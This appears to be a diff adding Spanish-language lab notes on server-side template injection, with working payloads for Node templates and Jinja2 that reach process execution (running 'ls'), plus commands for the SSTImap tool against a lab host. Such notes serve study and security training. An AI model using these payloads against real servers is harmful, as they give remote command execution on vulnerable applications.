@@ -75,5 +75,63 @@ Las vulnerabilidades normalmente entran poir lo anterior
 
 ![image](https://github.com/user-attachments/assets/79407ef5-a49d-4a53-8b63-88d22c56a7c8)
 
+```
+{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
+```
+
+# Python - Jinja2
+
+## Explotación
+
+![image](https://github.com/user-attachments/assets/822e9708-10d9-4c4a-8750-bacb5c1ad287)
+
+```
+{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
+```
+
+![image](https://github.com/user-attachments/assets/40db1b5b-e468-4de7-84c2-1dd24f4aaec7)
+
+![image](https://github.com/user-attachments/assets/4ea81fd5-8eb0-4ef3-b6bb-c572c8e7cd55)
+
+![image](https://github.com/user-attachments/assets/03b047d2-302d-4edb-8e54-5f5475f3969a)
+
+```
+subprocess.check_output([command, arg1, arg2])
+```
+
+```
+subprocess.check_output(['ls', '-lah'])
+```
+
+![image](https://github.com/user-attachments/assets/d41f8497-0dc1-43f8-991b-e786b99bcf8e)
+
+# Automatización
+
+SSTImap es una herramienta para automatizar el proceso y testear vulnerabilidades
+
+https://github.com/vladko312/SSTImap
+
+```
+pip install -r requeriments.txt
+```
+
+```
+python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='
+```
+
+## Ejempl
+
+```
+python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='
+```
+
+
+
+
+
+
+
+
+
 
 
